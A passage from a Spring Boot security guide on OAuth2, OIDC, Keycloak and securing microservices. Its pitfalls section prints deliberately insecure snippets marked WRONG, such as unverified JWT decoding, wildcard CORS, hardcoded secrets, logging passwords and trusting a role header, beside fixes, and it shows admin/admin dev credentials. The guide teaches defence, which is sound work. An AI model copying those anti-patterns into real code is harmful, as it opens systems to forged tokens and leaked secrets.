        if (!order.getUserId().equals(jwt.getSubject())) {
            throw new ResponseStatusException(HttpStatus.FORBIDDEN);
        }
        return order;
    }
}
```

### 8.5 Method-Level Security

```java
@Configuration
@EnableMethodSecurity(prePostEnabled = true, securedEnabled = true)
public class MethodSecurityConfig {}
```

```java
@Service
public class AdminService {

    @PreAuthorize("hasRole('ADMIN')")
    public void deleteUser(String userId) {
        // Only admins reach here
        userRepository.deleteById(userId);
    }

    @PreAuthorize("hasAuthority('SCOPE_write:orders')")
    public Order createOrder(OrderRequest request) {
        // Requires write:orders scope
    }

    @PreAuthorize("#userId == authentication.principal.subject or hasRole('ADMIN')")
    public UserProfile getUserProfile(String userId) {
        // User can view own profile, admins can view any
    }

    @PostFilter("filterObject.userId == authentication.principal.subject")
    public List<Order> getAllOrders() {
        // Returns all orders but filters to only requesting user's orders
        return orderRepository.findAll();
    }
}
```

### 8.6 OAuth2 Client — Calling Protected APIs

**Scenario**: Your Spring Boot service (Service A) needs to call another protected API (Service B) using Client Credentials.

```yaml
# application.yml
spring:
  security:
    oauth2:
      client:
        registration:
          service-b:
            client-id: service-a-client
            client-secret: ${CLIENT_SECRET}
            authorization-grant-type: client_credentials
            scope: read:orders
        provider:
          service-b:
            token-uri: https://auth.example.com/realms/myrealm/protocol/openid-connect/token
```

```java
@Configuration
public class WebClientConfig {

    @Bean
    public WebClient serviceWebClient(OAuth2AuthorizedClientManager authorizedClientManager) {
        ServletOAuth2AuthorizedClientExchangeFilterFunction oauth2Client =
            new ServletOAuth2AuthorizedClientExchangeFilterFunction(authorizedClientManager);
        oauth2Client.setDefaultClientRegistrationId("service-b");

        return WebClient.builder()
            .apply(oauth2Client.oauth2Configuration())
            .baseUrl("https://service-b.internal")
            .build();
    }

    @Bean
    public OAuth2AuthorizedClientManager authorizedClientManager(
            ClientRegistrationRepository clientRegistrationRepository,
            OAuth2AuthorizedClientRepository authorizedClientRepository) {

        OAuth2AuthorizedClientProvider authorizedClientProvider =
            OAuth2AuthorizedClientProviderBuilder.builder()
                .clientCredentials()
                .refreshToken()
                .build();

        DefaultOAuth2AuthorizedClientManager authorizedClientManager =
            new DefaultOAuth2AuthorizedClientManager(
                clientRegistrationRepository, authorizedClientRepository);
        authorizedClientManager.setAuthorizedClientProvider(authorizedClientProvider);
        return authorizedClientManager;
    }
}

@Service
public class OrderClient {
    @Autowired
    private WebClient serviceWebClient;

    public List<Order> getOrders() {
        return serviceWebClient.get()
            .uri("/api/orders")
            .retrieve()
            .bodyToFlux(Order.class)
            .collectList()
            .block();
    }
}
```

### 8.7 Authorization Code Flow with Spring Boot (Login Flow)

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          keycloak:
            client-id: my-web-app
            client-secret: ${KEYCLOAK_SECRET}
            authorization-grant-type: authorization_code
            redirect-uri: "{baseUrl}/login/oauth2/code/{registrationId}"
            scope: openid, profile, email
        provider:
          keycloak:
            issuer-uri: https://auth.example.com/realms/myrealm
```

```java
@Configuration
@EnableWebSecurity
public class WebAppSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/public/**").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(oauth2 -> oauth2
                .loginPage("/login")
                .defaultSuccessUrl("/dashboard")
                .userInfoEndpoint(userInfo -> userInfo
                    .oidcUserService(oidcUserService())
                )
            )
            .logout(logout -> logout
                .logoutSuccessUrl("/")
                .invalidateHttpSession(true)
                .deleteCookies("JSESSIONID")
            );

        return http.build();
    }

    @Bean
    public OidcUserService oidcUserService() {
        OidcUserService delegate = new OidcUserService();
        return (oidcUserRequest) -> {
            OidcUser oidcUser = delegate.loadUser(oidcUserRequest);
            // Enrich with custom claims from your database
            return oidcUser;
        };
    }
}

@Controller
public class DashboardController {

    @GetMapping("/dashboard")
    public String dashboard(@AuthenticationPrincipal OidcUser oidcUser, Model model) {
        model.addAttribute("name", oidcUser.getFullName());
        model.addAttribute("email", oidcUser.getEmail());
        return "dashboard";
    }
}
```

### 8.8 Role-Based Access with Custom Claims

```java
@Bean
public JwtAuthenticationConverter keycloakJwtAuthConverter() {
    JwtAuthenticationConverter converter = new JwtAuthenticationConverter();
    converter.setJwtGrantedAuthoritiesConverter(jwt -> {
        Set<GrantedAuthority> authorities = new HashSet<>();

        // Extract realm roles from Keycloak JWT structure
        Map<String, Object> realmAccess = jwt.getClaimAsMap("realm_access");
        if (realmAccess != null && realmAccess.containsKey("roles")) {
            List<String> roles = (List<String>) realmAccess.get("roles");
            roles.stream()
                .map(role -> new SimpleGrantedAuthority("ROLE_" + role.toUpperCase()))
                .forEach(authorities::add);
        }

        // Extract resource-specific roles
        Map<String, Object> resourceAccess = jwt.getClaimAsMap("resource_access");
        if (resourceAccess != null) {
            Map<String, Object> clientAccess = (Map<String, Object>) resourceAccess.get("my-client");
            if (clientAccess != null) {
                List<String> roles = (List<String>) clientAccess.get("roles");
                roles.stream()
                    .map(role -> new SimpleGrantedAuthority("ROLE_" + role.toUpperCase()))
                    .forEach(authorities::add);
            }
        }

        // Extract scopes
        String scope = jwt.getClaimAsString("scope");
        if (scope != null) {
            Arrays.stream(scope.split(" "))
                .map(s -> new SimpleGrantedAuthority("SCOPE_" + s))
                .forEach(authorities::add);
        }

        return authorities;
    });
    return converter;
}
```

### 8.9 Handling Token Expiry and Errors Gracefully

```java
@Component
public class JwtExceptionHandlerFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        try {
            filterChain.doFilter(request, response);
        } catch (JwtValidationException e) {
            response.setStatus(HttpStatus.UNAUTHORIZED.value());
            response.setContentType(MediaType.APPLICATION_JSON_VALUE);
            // Return RFC 7807 Problem Detail
            response.getWriter().write("""
                {
                  "type": "https://api.example.com/problems/invalid-token",
                  "title": "Invalid Token",
                  "status": 401,
                  "detail": "The provided token is invalid or expired"
                }
                """);
        }
    }
}
```

---

## 9. Using Keycloak

### 9.1 What Keycloak Is

Keycloak is an open-source Identity and Access Management (IAM) server. It provides:
- Authorization Server (OAuth 2.0 / OIDC)
- User federation (LDAP, Active Directory)
- Social login (Google, GitHub, Facebook)
- Admin UI for managing users, roles, clients
- Fine-grained authorization policies
- Single Sign-On (SSO) across multiple apps

**Why use Keycloak instead of building your own AS**: Building a secure Authorization Server correctly is extremely complex. Keycloak is battle-tested, actively maintained, and handles edge cases you haven't thought of yet.

### 9.2 Core Concepts

**Realm**: An isolated security domain. Think of it as a namespace. You'd typically have one realm per environment (dev, staging, prod) or one per product/tenant. Has its own users, clients, roles, and policies.

**Client**: Represents an application registered with Keycloak. Two types:
- *Public*: SPAs, mobile apps. No secret. Must use PKCE.
- *Confidential*: Backend apps, microservices. Has a client secret.

**Roles**: Named permissions assigned to users.
- *Realm roles*: Available across all clients in the realm.
- *Client roles*: Specific to a particular client.

**User**: An end-user account with credentials, attributes, and role assignments.

**Scope / Client Scope**: Defines what claims appear in tokens and what permissions are granted.

### 9.3 Running Keycloak

```bash
# Docker — for development
docker run -p 8080:8080 \
  -e KEYCLOAK_ADMIN=admin \
  -e KEYCLOAK_ADMIN_PASSWORD=admin \
  quay.io/keycloak/keycloak:24.0 start-dev
```

```yaml
# Production Docker Compose with PostgreSQL
version: '3.8'
services:
  postgres:
    image: postgres:15
    environment:
      POSTGRES_DB: keycloak
      POSTGRES_USER: keycloak
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    volumes:
      - postgres_data:/var/lib/postgresql/data

  keycloak:
    image: quay.io/keycloak/keycloak:24.0
    command: start
    environment:
      KC_DB: postgres
      KC_DB_URL: jdbc:postgresql://postgres:5432/keycloak
      KC_DB_USERNAME: keycloak
      KC_DB_PASSWORD: ${POSTGRES_PASSWORD}
      KC_HOSTNAME: auth.example.com
      KC_HTTPS_CERTIFICATE_FILE: /opt/keycloak/conf/server.crt
      KC_HTTPS_CERTIFICATE_KEY_FILE: /opt/keycloak/conf/server.key
      KEYCLOAK_ADMIN: admin
      KEYCLOAK_ADMIN_PASSWORD: ${ADMIN_PASSWORD}
    ports:
      - "443:8443"
    volumes:
      - ./certs:/opt/keycloak/conf
```

### 9.4 Spring Boot Integration

```yaml
# application.yml — Resource Server validating Keycloak tokens
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: http://localhost:8080/realms/my-realm
          jwk-set-uri: http://localhost:8080/realms/my-realm/protocol/openid-connect/certs
```

```java
@Configuration
@EnableWebSecurity
@EnableMethodSecurity
public class KeycloakSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt.jwtAuthenticationConverter(keycloakConverter()))
            )
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .csrf(AbstractHttpConfigurer::disable);

        return http.build();
    }

    @Bean
    public JwtAuthenticationConverter keycloakConverter() {
        JwtAuthenticationConverter converter = new JwtAuthenticationConverter();
        converter.setJwtGrantedAuthoritiesConverter(jwt -> {
            // Keycloak puts roles inside realm_access.roles
            Map<String, Object> realmAccess = jwt.getClaimAsMap("realm_access");
            if (realmAccess == null || !realmAccess.containsKey("roles")) {
                return Collections.emptyList();
            }
            List<String> roles = (List<String>) realmAccess.get("roles");
            return roles.stream()
                .map(r -> new SimpleGrantedAuthority("ROLE_" + r.toUpperCase()))
                .collect(Collectors.toList());
        });
        return converter;
    }
}
```

### 9.5 Keycloak Protocol Mapper for Custom Claims

To add application-specific data to tokens:
1. In Keycloak Admin: Client → Client Scopes → Add mapper
2. Choose "User Attribute" mapper
3. Token claim name: `department`, User attribute: `department`
4. Add to: Access token

```java
// Claims now available in JWT
String department = jwt.getClaimAsString("department");
```

### 9.6 Service Account (Client Credentials) in Keycloak

1. Create a client (e.g., `order-service`) → set "Service Accounts Enabled" = true.
2. Assign client roles to the service account.
3. Your service authenticates with `client_id` + `client_secret` via Client Credentials flow.

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          order-service:
            client-id: order-service
            client-secret: ${ORDER_SERVICE_SECRET}
            authorization-grant-type: client_credentials
            scope: read:inventory
        provider:
          order-service:
            token-uri: http://keycloak:8080/realms/my-realm/protocol/openid-connect/token
```

---

## 10. Securing Microservices

### 10.1 Token Propagation

When Service A (authenticated with user's token) calls Service B, it should propagate the user's token. Service B can then enforce user-level permissions.

```java
@Configuration
public class FeignSecurityConfig implements RequestInterceptor {

    @Override
    public void apply(RequestTemplate template) {
        // Extract current token from SecurityContext and forward it
        SecurityContext context = SecurityContextHolder.getContext();
        if (context.getAuthentication() instanceof JwtAuthenticationToken auth) {
            String token = auth.getToken().getTokenValue();
            template.header("Authorization", "Bearer " + token);
        }
    }
}
```

```java
// With WebClient
@Bean
public WebClient webClient() {
    return WebClient.builder()
        .filter((request, next) -> {
            // Propagate current request's token
            return ReactiveSecurityContextHolder.getContext()
                .map(ctx -> (JwtAuthenticationToken) ctx.getAuthentication())
                .map(auth -> ClientRequest.from(request)
                    .header("Authorization", "Bearer " + auth.getToken().getTokenValue())
                    .build())
                .flatMap(next::exchange);
        })
        .build();
}
```

### 10.2 Service-to-Service Authentication (Zero Trust)

In a Zero Trust architecture, even internal services must authenticate to each other. Don't trust the network.

**Pattern**: Each service has its own Client Credentials identity. Service A authenticates as itself when calling Service B.

```
User → [User Token] → API Gateway → Service A
                                        |
                                        | [Service A's own token via Client Credentials]
                                        v
                                    Service B
```

This allows Service B to have different authorization rules for calls from service accounts vs end users.

### 10.3 API Gateway as Security Enforcement Point

The API gateway enforces:
1. **Authentication**: Validates JWT before routing to downstream services.
2. **Rate limiting**: Per user, per client, per IP.
3. **SSL termination**: Handles TLS, forwards internally over HTTP or mTLS.
4. **Token introspection / forwarding**: Passes validated claims as headers.

```yaml
# Spring Cloud Gateway example
spring:
  cloud:
    gateway:
      routes:
        - id: order-service
          uri: http://order-service:8080
          predicates:
            - Path=/api/orders/**
          filters:
            - TokenRelay=          # Forwards OAuth2 token to downstream
            - name: RequestRateLimiter
              args:
                redis-rate-limiter.replenishRate: 100
                redis-rate-limiter.burstCapacity: 200
                key-resolver: "#{@userKeyResolver}"
```

```java
@Configuration
@EnableWebFluxSecurity
public class GatewaySecurityConfig {

    @Bean
    public SecurityWebFilterChain securityWebFilterChain(ServerHttpSecurity http) {
        return http
            .authorizeExchange(auth -> auth
                .pathMatchers("/api/public/**").permitAll()
                .anyExchange().authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2.jwt(Customizer.withDefaults()))
            .csrf(ServerHttpSecurity.CsrfSpec::disable)
            .build();
    }
}
```

### 10.4 mTLS (Mutual TLS) for Service-to-Service

mTLS requires both the client and server to present certificates, providing strong identity verification without tokens.

```yaml
# application.yml — mTLS configuration
server:
  ssl:
    enabled: true
    client-auth: need           # Require client certificate
    key-store: classpath:server-keystore.p12
    key-store-password: ${KEYSTORE_PASS}
    trust-store: classpath:truststore.p12   # Trust internal CA
    trust-store-password: ${TRUSTSTORE_PASS}
```

**When to use mTLS vs Client Credentials**:
- mTLS is stronger (certificate-based) but operationally complex (certificate lifecycle management).
- Client Credentials is simpler and standard for most microservice auth needs.
- Use both for defense in depth in high-security environments.

### 10.5 Claims Forwarding via Gateway

The gateway validates the JWT and forwards user identity as request headers. Downstream services trust these headers (because they only accept traffic from the gateway).

```java
@Component
public class ClaimsForwardingFilter implements GlobalFilter {

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, GatewayFilterChain chain) {
        return ReactiveSecurityContextHolder.getContext()
            .map(ctx -> (JwtAuthenticationToken) ctx.getAuthentication())
            .map(auth -> {
                ServerHttpRequest mutatedRequest = exchange.getRequest().mutate()
                    .header("X-User-Id", auth.getToken().getSubject())
                    .header("X-User-Roles", String.join(",", auth.getToken()
                        .getClaimAsStringList("roles")))
                    .build();
                return exchange.mutate().request(mutatedRequest).build();
            })
            .defaultIfEmpty(exchange)
            .flatMap(chain::filter);
    }
}
```

---

## 11. Best Practices

### 11.1 Token Storage

| Token | Storage | Why |
|---|---|---|
| Access Token (SPA) | In-memory JS variable | XSS cannot persist it across reloads |
| Access Token (mobile) | Secure Enclave / Keychain | OS-level protection |
| Refresh Token (web) | HttpOnly, Secure, SameSite=Strict cookie | JavaScript cannot read it |
| Refresh Token (mobile) | OS secure storage | Same as above |
| Access Token (server-side) | In-memory / encrypted DB | Rotated frequently |
| Client Secret | Vault (HashiCorp, AWS Secrets Manager) | Never in config files |

**Never** store tokens in:
- `localStorage` (XSS-accessible)
- URL parameters (logs, history)
- Git repositories
- Unencrypted config files

### 11.2 HTTPS Enforcement

```java
// Force HTTPS in Spring Boot
@Configuration
public class HttpsConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .requiresChannel(channel -> channel
                .anyRequest().requiresSecure()
            )
            .headers(headers -> headers
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                    .preload(true)
                )
            );
        return http.build();
    }
}
```

```yaml
# application.yml
server:
  ssl:
    enabled: true
    key-store: classpath:keystore.p12
    key-store-password: ${SSL_KEY_STORE_PASSWORD}
    key-store-type: PKCS12
  http2:
    enabled: true
```

### 11.3 Scope Design

**Principles:**
- Use resource:action format: `orders:read`, `orders:write`, `users:admin`.
- Match scopes to actual API operations, not to UI screens.
- Never create catch-all scopes like `all` or `admin`.
- Request minimum scopes needed (principle of least privilege).

```
BAD:  scope=admin
GOOD: scope=orders:read invoices:read

BAD:  scope=read
GOOD: scope=orders:read

BAD:  scope=everything
GOOD: scope=user:profile:read user:profile:write
```

### 11.4 Least Privilege

Apply minimum permissions at every layer:
- **OAuth scopes**: Only request what you need.
- **Database credentials**: Service accounts with read-only access to specific tables.
- **Infrastructure roles**: IAM roles with specific resource access.
- **API endpoints**: Check authorization on every endpoint, not just at login.

### 11.5 Security Headers

```java
http.headers(headers -> headers
    .contentTypeOptions(Customizer.withDefaults())         // X-Content-Type-Options: nosniff
    .frameOptions(frame -> frame.deny())                   // X-Frame-Options: DENY
    .xssProtection(Customizer.withDefaults())              // X-XSS-Protection: 1; mode=block
    .contentSecurityPolicy(csp -> csp
        .policyDirectives("default-src 'self'; " +
                          "script-src 'self'; " +
                          "style-src 'self'; " +
                          "img-src 'self' data:; " +
                          "connect-src 'self' https://api.example.com")
    )
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
    .permissionsPolicy(pp -> pp.policy("camera=(), microphone=(), geolocation=()"))
);
```

### 11.6 Rate Limiting

```java
@Component
public class RateLimitingFilter extends OncePerRequestFilter {

    private final Map<String, RateLimiter> limiters = new ConcurrentHashMap<>();

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        String clientId = extractClientId(request); // from JWT sub or IP
        RateLimiter limiter = limiters.computeIfAbsent(clientId,
            k -> RateLimiter.create(100.0)); // 100 requests/second

        if (!limiter.tryAcquire()) {
            response.setStatus(429);
            response.setHeader("Retry-After", "1");
            return;
        }
        chain.doFilter(request, response);
    }

    private String extractClientId(HttpServletRequest request) {
        // Try to get user ID from token first, fall back to IP
        String auth = request.getHeader("Authorization");
        if (auth != null && auth.startsWith("Bearer ")) {
            try {
                // Quick parse without full validation for rate limiting key
                String payload = auth.split("\\.")[1];
                String decoded = new String(Base64.getUrlDecoder().decode(payload));
                return new ObjectMapper().readTree(decoded).path("sub").asText();
            } catch (Exception ignored) {}
        }
        return request.getRemoteAddr();
    }
}
```

---

## 12. Observability & Debugging

### 12.1 Logging Auth Flows

```java
@Slf4j
@Component
public class AuthenticationAuditListener implements ApplicationListener<AbstractAuthenticationEvent> {

    @Override
    public void onApplicationEvent(AbstractAuthenticationEvent event) {
        if (event instanceof AuthenticationSuccessEvent) {
            Authentication auth = event.getAuthentication();
            log.info("AUTH_SUCCESS principal={} type={}",
                maskPrincipal(auth.getName()),
                auth.getClass().getSimpleName());
        } else if (event instanceof AbstractAuthenticationFailureEvent failure) {
            log.warn("AUTH_FAILURE principal={} reason={}",
                maskPrincipal(failure.getAuthentication().getName()),
                failure.getException().getMessage());
        }
    }

    private String maskPrincipal(String principal) {
        // Never log full email or user ID
        if (principal != null && principal.contains("@")) {
            return principal.replaceAll("(.{2}).+(@.+)", "$1***$2");
        }
        return principal != null ? principal.substring(0, Math.min(8, principal.length())) + "..." : "null";
    }
}
```

```java
// MDC for request tracing — propagate user context through logs
@Component
public class SecurityContextMdcFilter extends OncePerRequestFilter {

    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        try {
            Authentication auth = SecurityContextHolder.getContext().getAuthentication();
            if (auth instanceof JwtAuthenticationToken jwtAuth) {
                MDC.put("userId", jwtAuth.getToken().getSubject());
                MDC.put("clientId", jwtAuth.getToken().getClaimAsString("azp"));
            }
            chain.doFilter(request, response);
        } finally {
            MDC.clear(); // Always clear MDC
        }
    }
}
```

### 12.2 Debugging Token Issues

**Step 1**: Decode the JWT without verifying it to inspect claims.

```bash
# Quick decode (Linux/Mac)
echo "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.SIGNATURE" | \
  cut -d. -f2 | \
  base64 -d 2>/dev/null | \
  python3 -m json.tool
```

**Common issues and diagnostics:**

```
401 Unauthorized
├── "JWT expired" → Token past exp claim. Check system clock skew.
├── "Invalid signature" → Wrong signing key or JWKS cache stale. Try refreshing JWKS.
├── "Invalid issuer" → iss claim doesn't match expected. Check issuer-uri config.
├── "Invalid audience" → aud claim missing expected value. Verify audience config.
└── "Bearer token missing" → Authorization header not sent or malformed.

403 Forbidden
├── User authenticated but lacks required role/scope.
├── Check JWT claims for actual roles: jwt.getClaimAsStringList("roles")
├── Check your JwtAuthenticationConverter is mapping claims correctly.
└── Check @PreAuthorize expression against actual authority names.
```

```java
// Debug endpoint — ONLY in development/staging, NEVER in production
@GetMapping("/debug/token")
@Profile({"dev", "local"})
public Map<String, Object> debugToken(@AuthenticationPrincipal Jwt jwt) {
    Map<String, Object> debug = new HashMap<>();
    debug.put("subject", jwt.getSubject());
    debug.put("issuer", jwt.getIssuer());
    debug.put("audience", jwt.getAudience());
    debug.put("expiry", jwt.getExpiresAt());
    debug.put("claims", jwt.getClaims());
    debug.put("authorities", SecurityContextHolder.getContext()
        .getAuthentication().getAuthorities());
    return debug;
}
```

### 12.3 Monitoring Security Events

Metrics to alert on:

```java
@Component
public class SecurityMetrics {

    private final MeterRegistry meterRegistry;
    private final Counter authFailures;
    private final Counter tokenValidationErrors;

    public SecurityMetrics(MeterRegistry meterRegistry) {
        this.meterRegistry = meterRegistry;
        this.authFailures = Counter.builder("security.auth.failures")
            .tag("type", "authentication")
            .description("Authentication failure count")
            .register(meterRegistry);
        this.tokenValidationErrors = Counter.builder("security.token.validation.errors")
            .description("JWT validation error count")
            .register(meterRegistry);
    }

    public void recordAuthFailure(String reason) {
        Counter.builder("security.auth.failures")
            .tag("reason", reason)
            .register(meterRegistry)
            .increment();
    }
}
```

**Alerts to configure:**
- Spike in 401 responses (brute force, token mass expiry).
- Spike in 403 responses (privilege escalation attempts, misconfiguration).
- Failed refresh token usage after rotation (refresh token theft indicator).
- Unusual geographic/IP access patterns.
- High rate of new token issuances from same IP.

---

## 13. Real-World Scenarios

### 13.1 Scenario: Public REST API with Third-Party Clients

**Context**: You provide a REST API that developers integrate into their apps (like Stripe, Twilio).

**Architecture:**
```
Third-Party App → [API Key or OAuth2 Client Credentials] → Your API Gateway → Microservices
```

**Security Approach:**
- Issue OAuth2 client credentials (client_id + secret) to registered developers.
- Enforce scopes to limit API surface per client.
- Rate limiting per client_id, with different tiers.
- API versioning to deprecate old endpoints gracefully.
- Webhook security: sign payloads with HMAC-SHA256 so receivers can verify origin.

**Key decisions:**
- JWT access tokens (15 min expiry) — no AS call on every API request.
- API keys for simple use cases (no user context needed) — fast but no delegation.
- Client credentials for automated/server-side clients.

**Trade-offs:**
- JWTs: Scalable, but revocation requires denylist or short expiry.
- Opaque tokens: Instant revocation, but AS introspection call overhead.
- API keys: Simple, but coarse-grained and hard to rotate.

---

### 13.2 Scenario: Microservices System with User Authentication

**Context**: E-commerce platform with order-service, inventory-service, payment-service.

```
Browser/Mobile → [OIDC Auth Code + PKCE] → API Gateway → Order Service
                                                               |
                                                               | [Client Credentials]
                                                               v
                                                         Inventory Service
                                                               |
                                                               | [Client Credentials]
                                                               v
                                                         Payment Service
```

**Security Approach:**
- Users authenticate via OIDC Authorization Code Flow with PKCE.
- API Gateway validates user JWT and forwards `X-User-Id` header.
- Service-to-service calls use Client Credentials.
- Each service validates tokens independently (no central session store).
- Keycloak as the Authorization Server.
- Short-lived access tokens (15 min) + refresh tokens stored in HttpOnly cookies.

**Token propagation decisions:**
- For user-context calls (show my orders): propagate user token downstream.
- For system calls (background job updating inventory): use service account token.

**Trade-offs:**
- Distributed token validation: Fast (no AS call), but revocation is eventually consistent.
- Token propagation adds latency awareness — consider caching validated tokens for the request lifetime.

---

### 13.3 Scenario: Mobile App Backend

**Context**: iOS/Android app consuming a REST API.

**Architecture:**
```
Mobile App → [Auth Code + PKCE, no client_secret] → Keycloak
           → [Access Token in memory] → Backend API
           → [Refresh Token in OS Keychain] → Keycloak (silent refresh)
```

**Security Approach:**
- Public client (mobile can't store client_secret safely).
- PKCE is mandatory — prevents code interception.
- Access token in memory, never persisted.
- Refresh token in OS Keychain (iOS) or Android Keystore.
- Certificate pinning to prevent MITM on the auth flow.
- Token binding (DPoP) for high-security scenarios (banking apps).
- Jailbreak/root detection to refuse operation on compromised devices.

**Specific risks and mitigations:**

| Risk | Mitigation |
|---|---|
| App reverse-engineered to extract client_secret | Use public client (no secret) |
| Refresh token stolen from device storage | Use OS secure storage + device binding |
| MITM on token request | Certificate pinning + HTTPS |
| Code interception via URI scheme | PKCE + custom scheme or Universal Links |

---

### 13.4 Scenario: Internal Admin Tool

**Context**: Internal dashboard for ops team, low external risk.

**Architecture:**
```
Ops Browser → [OIDC SSO via Company IdP (Okta/Azure AD)] → Admin App
```

**Security Approach:**
- Use company SSO — don't maintain your own user store for internal tools.
- OIDC Authorization Code Flow.
- Roles mapped from corporate directory groups.
- Audit log every admin action.
- Session timeout (30 min idle) + MFA enforced by corporate IdP.
- Network restriction: Only accessible on VPN or corporate network.

**What you don't need:**
- Refresh tokens with long expiry (ops team can re-authenticate).
- Complex scope design (simple ADMIN/READ_ONLY roles sufficient).
- High-throughput token validation (small user base).

---

### 13.5 Scenario: B2B SaaS with Tenant Isolation

**Context**: Multi-tenant SaaS where each company is a tenant with their own users and data.

**Architecture:**
```
Tenant A Users → Keycloak Realm A → Your API (tenant=A enforced)
Tenant B Users → Keycloak Realm B → Your API (tenant=B enforced)
```

**Or with a single realm and groups:**
```
All Users → Keycloak (single realm) → JWT with tenant_id claim → Your API
```

**Security Approach:**
- Include `tenant_id` in JWT claims.
- Validate `tenant_id` on every data access operation.
- Database-level row security or separate schemas per tenant.
- Service account per tenant for system operations.
- Tenant-specific rate limits.

```java
// Tenant-aware data access
@GetMapping("/orders")
public List<Order> getOrders(@AuthenticationPrincipal Jwt jwt) {
    String tenantId = jwt.getClaimAsString("tenant_id");
    if (tenantId == null) {
        throw new AccessDeniedException("No tenant context");
    }
    // Always include tenantId in queries — never allow cross-tenant access
    return orderRepository.findByTenantId(tenantId);
}
```

---

## 14. Common Pitfalls

### 14.1 Incorrect Token Validation

**Pitfall**: Decoding the JWT and reading claims without verifying the signature.

```java
// WRONG — anyone can forge a token and this code accepts it
String payload = new String(Base64.getDecoder().decode(token.split("\\.")[1]));
JSONObject claims = new JSONObject(payload);
String userId = claims.getString("sub"); // NEVER DO THIS
```

```java
// CORRECT — Spring Security handles this automatically when configured properly
@GetMapping("/orders")
public List<Order> getOrders(@AuthenticationPrincipal Jwt jwt) {
    // jwt is only non-null if signature was verified by Spring Security
    String userId = jwt.getSubject();
    return orderRepository.findByUserId(userId);
}
```

### 14.2 Not Validating Audience

**Pitfall**: A token issued for Service A is accepted by Service B.

```java
// If Service B doesn't check aud, tokens for other services work here
// An attacker who has a token for Service A can call Service B

// FIX: Always configure expected audience
@Bean
public JwtDecoder jwtDecoder() {
    NimbusJwtDecoder decoder = NimbusJwtDecoder.withJwkSetUri(jwksUri).build();
    decoder.setJwtValidator(new DelegatingOAuth2TokenValidator<>(
        JwtValidators.createDefaultWithIssuer(issuer),
        new JwtClaimValidator<List<String>>("aud", aud ->
            aud != null && aud.contains("service-b")) // Your service's audience
    ));
    return decoder;
}
```

### 14.3 Over-Permissive CORS

```java
// WRONG — allows any origin
http.cors(cors -> cors.configurationSource(req -> {
    CorsConfiguration config = new CorsConfiguration();
    config.addAllowedOrigin("*"); // BAD
    config.addAllowedMethod("*");
    config.addAllowedHeader("*");
    return config;
}));

// CORRECT — explicit allowed origins
@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://app.example.com", "https://admin.example.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
    config.setAllowCredentials(true); // Required for cookies
    config.setMaxAge(3600L);
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", config);
    return source;
}
```

### 14.4 Hardcoded Secrets

```yaml
# WRONG
spring:
  security:
    oauth2:
      client:
        registration:
          myapp:
            client-secret: my-super-secret-value   # In git = compromised

# CORRECT — use environment variables
spring:
  security:
    oauth2:
      client:
        registration:
          myapp:
            client-secret: ${OAUTH2_CLIENT_SECRET}  # Injected at runtime
```

```java
// Use Spring Cloud Vault or AWS Secrets Manager for production
@Value("${oauth2.client.secret}")
private String clientSecret; // Injected from Vault, not config file
```

### 14.5 Logging Sensitive Data

```java
// WRONG
log.debug("Token: {}", accessToken); // Full token in logs
log.info("User {} authenticated with password {}", username, password);

// CORRECT
log.debug("Token issued for user {}, expires at {}", userId, expiry);
log.info("User {} authenticated successfully", maskEmail(username));
```

### 14.6 Not Handling Token Rotation Replay

```java
// If you implement refresh token rotation, detect replay attacks
@Service
public class RefreshTokenService {

    public TokenPair refreshTokens(String refreshToken) {
        RefreshTokenEntity entity = refreshTokenRepository.findByToken(refreshToken)
            .orElseThrow(() -> new InvalidTokenException("Unknown refresh token"));

        if (entity.isUsed()) {
            // Replay detected — this token was already used once
            // Invalidate the entire token family (all related tokens)
            revokeEntireFamily(entity.getFamilyId());
            log.warn("SECURITY: Refresh token replay detected for family {}. " +
                     "All tokens in family revoked.", entity.getFamilyId());
            throw new SecurityException("Refresh token replay detected");
        }

        entity.setUsed(true);
        refreshTokenRepository.save(entity);

        // Issue new token pair
        return issueNewTokenPair(entity.getUserId(), entity.getFamilyId());
    }
}
```

### 14.7 Trusting User-Supplied Data in Tokens

```java
// WRONG — reading role from request header and trusting it
@GetMapping("/admin/users")
public List<User> getUsers(@RequestHeader("X-User-Role") String role) {
    if ("ADMIN".equals(role)) { // Anyone can fake this header
        return userRepository.findAll();
    }
    throw new AccessDeniedException();
}

// CORRECT — roles come only from verified JWT
@GetMapping("/admin/users")
@PreAuthorize("hasRole('ADMIN')")
